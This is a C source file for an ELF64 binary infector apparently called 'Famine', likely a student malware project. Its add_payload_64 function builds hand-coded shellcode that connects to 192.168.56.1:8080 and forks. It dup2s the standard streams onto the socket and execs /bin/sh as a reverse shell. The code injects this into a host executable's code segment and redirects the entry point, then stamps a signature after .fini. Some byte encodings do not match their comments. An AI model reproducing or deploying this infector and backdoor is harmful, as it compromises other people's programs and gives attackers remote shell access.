#include "famine.h"

Elf64_Off find_fini_offset_64(unsigned char *file) {
    Elf64_Ehdr *header64 = (Elf64_Ehdr *)file;
    void *section_table = (Elf64_Shdr *)(file + header64->e_shoff);
    void *section_name = &((Elf64_Shdr *)section_table)[header64->e_shstrndx];
    char *start_name_section = (char *)(file + ((Elf64_Shdr *)section_name)->sh_offset);
    int shnum = header64->e_shnum;

    for (int i = 0; i < shnum; i++) {
        Elf64_Shdr *section = &((Elf64_Shdr *)section_table)[i];
        char *name_section = start_name_section + section->sh_name;
        if (!strcmp(name_section, ".fini"))
            return section->sh_offset;
    }
    return 0;
}

Elf64_Addr find_fini_size_64(unsigned char *file) {
    Elf64_Ehdr *header64 = (Elf64_Ehdr *)file;
    void *section_table = (Elf64_Shdr *)(file + header64->e_shoff);
    void *section_name = &((Elf64_Shdr *)section_table)[header64->e_shstrndx];
    char *start_name_section = (char *)(file + ((Elf64_Shdr *)section_name)->sh_offset);
    int shnum = header64->e_shnum;

    for (int i = 0; i < shnum; i++) {
        Elf64_Shdr *section = &((Elf64_Shdr *)section_table)[i];
        char *name_section = start_name_section + section->sh_name;
        if (!strcmp(name_section, ".fini"))
            return section->sh_size;
    }
    return 0;
}

Elf64_Addr find_main_addr_64(unsigned char *file) {
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)file;
    Elf64_Shdr *shdr = (Elf64_Shdr *)(file + ehdr->e_shoff);
    const char *sh_strtab = (char *)(file + shdr[ehdr->e_shstrndx].sh_offset);

    Elf64_Shdr *symtab = NULL;
    Elf64_Shdr *strtab = NULL;

    // Recherche symtab et strtab
    for (int i = 0; i < ehdr->e_shnum; i++) {
        const char *section_name = sh_strtab + shdr[i].sh_name;
        if (!strcmp(section_name, ".symtab"))
            symtab = &shdr[i];
        else if (!strcmp(section_name, ".strtab"))
            strtab = &shdr[i];
    }

    // exec non strip
    if (symtab && strtab) {
        Elf64_Sym *symbols = (Elf64_Sym *)(file + symtab->sh_offset);
        const char *strtab_data = (char *)(file + strtab->sh_offset);
        int num_symbols = symtab->sh_size / sizeof(Elf64_Sym);

        for (int i = 0; i < num_symbols; i++) {
            const char *name = strtab_data + symbols[i].st_name;
            if (!strcmp(name, "main"))
                return symbols[i].st_value;
        }
    }
    
    return 0;
}

int add_payload_64(unsigned char *file) {
    unsigned char payload_door[] = {
        // --- Save stack ---
        0x48, 0x89, 0xe3,                           // mov rbx, rsp
        0x48, 0x31, 0xc0,                           // xor rax, rax
        // 6 - 6

        // socket(AF_INET, SOCK_STREAM, 0)
        0x48, 0x31, 0xc0,                           // xor rax, rax
        0x48, 0xc7, 0xc7, 0x29, 0x00, 0x00, 0x00,   // mov rdi, 41
        0x48, 0xc7, 0xc6, 0x02, 0x00, 0x00, 0x00,   // mov rsi, 2
        0xba, 0x01, 0x00, 0x00, 0x00,               // mov edx, 1
        0xb8, 0x00, 0x00, 0x00, 0x00,               // mov eax, 0
        0x0f, 0x05,                                 // syscall
        // 29 - 35

        0x49, 0x89, 0xC0,                           // mov r8, rax
        // 3 - 38

        // create value struct sockaddr
        0x4D, 0x31, 0xD2,                               // xor r10, r10
        0x66, 0xC7, 0x07, 0x02, 0x00,                   // mov word [r10], 0x2
        0x66, 0xC7, 0x47, 0x02, 0x1F, 0x90,             // mov word [r10+2], 0x1F90  => Port 8080
        0xC7, 0x47, 0x04, 0xC0, 0xA8, 0x38, 0x01,       // mov dword [r10+4], 0xC0A83801 => addr ip 192.168.56.1
        0x48, 0x31, 0x00,                               // xor [r10+8], rax
        // 24 - 62

        // connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr))
        0x48, 0xc7, 0xc0, 0x2a, 0x00, 0x00, 0x00,       // mov rax, 42
        0x4c, 0x89, 0xc7,                               // mov rdi, r8
        0x4c, 0x89, 0xd6,                               // mov rsi, r10
        0xba, 0x10, 0x00, 0x00, 0x00,                   // mov edx, 16
        0x0f, 0x05,                                     // syscall
        // 20 - 82

        // fork()
        0x48, 0xc7, 0xc0, 0x39, 0x00, 0x00, 0x00,       // mov rax,57
        0x0f, 0x05,                                     // syscall
        // 9 - 91

        // si enfant -> rax = 0
        0x48, 0x85, 0xc0,                               // test rax, rax
        0x0f, 0x85, 0x4e, 0x00, 0x00, 0x00,             // jne on saute de 78
        // 9 - 100

        // dup2
        0x48, 0xc7, 0xc0, 0x21, 0x00, 0x00, 0x00,       // mov rax, 33
        0x49, 0x89, 0xc7,                               // mov rdi, r8
        0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00,       // mov rsi, 0 -> stdin
        0x0f, 0x05,                                     // syscall
        // 19 - 119

        0x48, 0xc7, 0xc6, 0x01, 0x00, 0x00, 0x00,       // mov rsi, 1 -> stdout
        0x0f, 0x05,                                     // syscall
        // 9 - 128

        0x48, 0xc7, 0xc6, 0x02, 0x00, 0x00, 0x00,       // mov rsi, 2 -> stderr
        0x0f, 0x05,                                     // syscall
        // 9 - 137

        // execve("/bin/sh", NULL, NULL)
        0x48, 0x31, 0xd2,                                               // xor rdx, rdx
        0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,     // mov rbx, 0x68732f6e69622f
        0x53,                                                           // push rbx
        0x48, 0x89, 0xe7,                                               // mov rdi, rsp
        0x48, 0x31, 0xf6,                                               // xor rsi, rsi
        0xb8, 0x3b, 0x00, 0x00, 0x00,                                   // mov eax, 59
        0x0f, 0x05,                                                     // syscall
        // 27 - 164

        // exit(1)
        0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,       // mov rdi, 1
        0xb8, 0x3c, 0x00, 0x00, 0x00,                   // mov eax, 60
        0x0f, 0x05,                                     // syscall
        // 14 - 174

        0x48, 0x8b, 0x3c, 0x24,                                     // mov    rdi, [rsp]      ; argc
        0x48, 0x8d, 0x74, 0x24, 0x08,                               // lea    rsi, [rsp+8]    ; argv
        0x48, 0x89, 0xf1,                                           // mov    rcx, rsi        ; rcx = argv
        0x48, 0x8b, 0x01,                                           // mov    rax, [rcx]      ; rax = argv[i]
        0x48, 0x83, 0xc1, 0x08,                                     // add    rcx, 8          ; pointer vers argv[i+1]
        0x48, 0x85, 0xc0,                                           // test   rax, rax
        0x75, 0xf4,                                                 // jnz    -0x0C
        0x48, 0x89, 0xca,                                           // mov    rdx, rcx        ; rdx = envp
        0x48, 0xb8,                                                 // mov rax, <main_addr>
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // <main_addr>
        0xff, 0xd0,                                                 // call rax
        // 39 - 213
    };

    Elf64_Addr main_addr = find_main_addr_64(file);
    if (main_addr == 0)
        return -1;
    memcpy(&payload_door[203], &main_addr, 8);

    size_t payload_size = sizeof(payload_door) - 1;

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)file;
    Elf64_Phdr *phdr = (Elf64_Phdr *)(file + ehdr->e_phoff);

    // find PT_LOAD
    Elf64_Phdr *exec_segment = NULL;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if ((phdr[i].p_type == PT_LOAD) && (phdr[i].p_flags & PF_X)) {
            exec_segment = &phdr[i];
            break;
        }
    }
    if (!exec_segment)
        return -1;

    size_t injection_offset = exec_segment->p_offset + exec_segment->p_filesz;
    Elf64_Addr injection_vaddr = exec_segment->p_vaddr + exec_segment->p_filesz;

    exec_segment->p_filesz += payload_size;
    exec_segment->p_memsz  += payload_size;

    memcpy(file + injection_offset, payload_door, payload_size);
    
    ehdr->e_entry = injection_vaddr;

    return payload_size;
}

int handle_64(unsigned char *file) {
    unsigned char payload[] = "Famine version 0.7 (c)oded jul-0064 by bob\n";
    size_t size_payload = strlen((const char *)payload);

    int size_payload_door = add_payload_64(file);
    size_t injection_offset;
    if (size_payload_door == -1)
        injection_offset = find_fini_offset_64(file) + find_fini_size_64(file);
    else
        injection_offset = find_fini_offset_64(file) + find_fini_size_64(file) + size_payload_door;
    // size_t injection_offset = find_fini_offset_64(file) + find_fini_size_64(file);

    memcpy(file + injection_offset, payload, size_payload);

    return 0;
}
    